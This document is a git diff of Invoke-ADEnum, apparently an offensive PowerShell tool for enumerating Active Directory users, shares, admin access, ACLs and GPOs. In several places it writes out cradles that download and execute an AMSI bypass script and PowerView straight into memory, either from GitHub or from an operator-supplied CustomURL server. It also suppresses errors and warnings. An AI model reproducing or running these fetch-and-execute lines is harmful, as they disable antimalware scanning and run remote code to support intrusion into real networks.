@@ -1,8 +1,8 @@
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
-
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView.ps1')
-
-Set-Variable MaximumHistoryCount 32767
+<#
+PowerView Author: Will Schroeder (@harmj0y)
+Invoke-ADEnum Author: Rob LP (@L3o4j)
+Required Dependencies: PowerView
+#>
 
 function Invoke-ADEnum
 {
@@ -23,6 +23,10 @@ Specify where to save the output from the tool (default is pwd)
 
 .PARAMETER Exclude
 Exclude a specific domain from enumeration
+
+.PARAMETER CustomURL
+Specify the Server URL where you're hosting SimpleAMSI.ps1 and PowerView.ps1
+Example: http://yourserver.com/Tools
 
 .SWITCH NoServers
 Do not enumerate for Servers
@@ -81,42 +85,79 @@ Invoke-ADEnum -Output C:\Windows\Temp\Invoke-ADEnum.txt
         $Exclude,
         
         [Parameter (Mandatory=$False, Position = 4, ValueFromPipeline=$true)]
-        [Switch]
-        $NoServers,
+        [String]
+        $CustomURL,
         
         [Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
         [Switch]
-        $NoWorkstations,
+        $NoServers,
         
         [Parameter (Mandatory=$False, Position = 6, ValueFromPipeline=$true)]
         [Switch]
-        $NoUnsupportedOS,
+        $NoWorkstations,
         
         [Parameter (Mandatory=$False, Position = 7, ValueFromPipeline=$true)]
         [Switch]
-        $NoUsers,
+        $NoUnsupportedOS,
         
         [Parameter (Mandatory=$False, Position = 8, ValueFromPipeline=$true)]
         [Switch]
-        $NoShares,
+        $NoUsers,
         
         [Parameter (Mandatory=$False, Position = 9, ValueFromPipeline=$true)]
         [Switch]
-        $NoLocalAdminAccess,
+        $NoShares,
         
         [Parameter (Mandatory=$False, Position = 10, ValueFromPipeline=$true)]
         [Switch]
-        $NoACLs,
+        $NoLocalAdminAccess,
         
         [Parameter (Mandatory=$False, Position = 11, ValueFromPipeline=$true)]
         [Switch]
-        $NoGPOs,
+        $NoACLs,
         
         [Parameter (Mandatory=$False, Position = 12, ValueFromPipeline=$true)]
+        [Switch]
+        $NoGPOs,
+        
+        [Parameter (Mandatory=$False, Position = 13, ValueFromPipeline=$true)]
         [Switch]
         $NoFindDomainUserLocation
 
     )
+    
+    $ErrorActionPreference = "SilentlyContinue"
+    $WarningPreference = "SilentlyContinue"
+    Set-Variable MaximumHistoryCount 32767
+    
+    if($CustomURL){
+        $CustomURL = $CustomURL.TrimEnd('/')
+        try{
+            iex(new-object net.webclient).downloadstring("$CustomURL/SimpleAMSI.ps1")
+            iex(new-object net.webclient).downloadstring("$CustomURL/PowerView.ps1")
+        }
+        catch{
+            $errorMessage = $_.Exception.Message
+            Write-Host ""
+            Write-Host "$errorMessage" -ForegroundColor Red
+            Write-Host ""
+            break
+        }
+    }
+	
+    else{
+        try{
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView.ps1')
+        }
+        catch{
+            $errorMessage = $_.Exception.Message
+            Write-Host ""
+            Write-Host "$errorMessage" -ForegroundColor Red
+            Write-Host ""
+            break
+        }
+    }
     
     if($Domain){
 	if($Server){}
@@ -131,9 +172,6 @@ Invoke-ADEnum -Output C:\Windows\Temp\Invoke-ADEnum.txt
 	$DomainParam = [Parameter(Mandatory=$True, Position=1, ValueFromPipeline=$true)][String]$Domain
 	#$ServerParam = [Parameter(Mandatory=$True, Position=2, ValueFromPipeline=$true)][String]$Server
     }
-
-    $ErrorActionPreference = "SilentlyContinue"
-    $WarningPreference = "SilentlyContinue"
     
     # Set the path and filename for the output file
     if($Output){$OutputFilePath = $Output}
@@ -141,7 +179,7 @@ Invoke-ADEnum -Output C:\Windows\Temp\Invoke-ADEnum.txt
     else{$OutputFilePath = "$pwd\Invoke-ADEnum.txt"}
     
     # Start capturing the script's output and save it to the file
-    Start-Transcript -Path $OutputFilePath
+    Start-Transcript -Path $OutputFilePath | Out-Null
     
     clear
     
@@ -1261,7 +1299,9 @@ Invoke-ADEnum -Output C:\Windows\Temp\Invoke-ADEnum.txt
     }
     
     # Stop capturing the output and display it on the console
-    Stop-Transcript
+    Stop-Transcript | Out-Null
+    Write-Host "Output file: $OutputFilePath"
+    Write-Host ""
     
     # Clean up error lines from output
     (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'TerminatingError' } | Set-Content $OutputFilePath
